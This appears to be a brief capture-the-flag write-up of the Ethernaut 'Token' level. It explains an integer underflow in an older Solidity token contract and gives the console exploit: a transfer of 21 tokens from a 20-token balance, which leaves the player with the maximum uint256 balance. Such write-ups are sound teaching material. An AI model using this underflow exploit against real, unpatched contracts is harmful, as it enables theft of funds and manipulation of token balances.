# Token

Classic Underflow vulnerability, in which a 20 - 21 = -ve number which returns the max num of uint (abbrev. of uint256). Though, on recent versions of Solidity is much less common due to compiler safety and reversion of txn.

```Solidity
// https://dev.to/nvn/ethernaut-hacks-level-5-token-2j4o
// Payload to cause underflow
await contract.transfer('0x0000000000000000000000000000000000000000', 21)

await contract.balanceOf(player).then(v => v.toString())
// return: '115792089237316195423570985008687907853269984665640564039457584007913129639935'
```
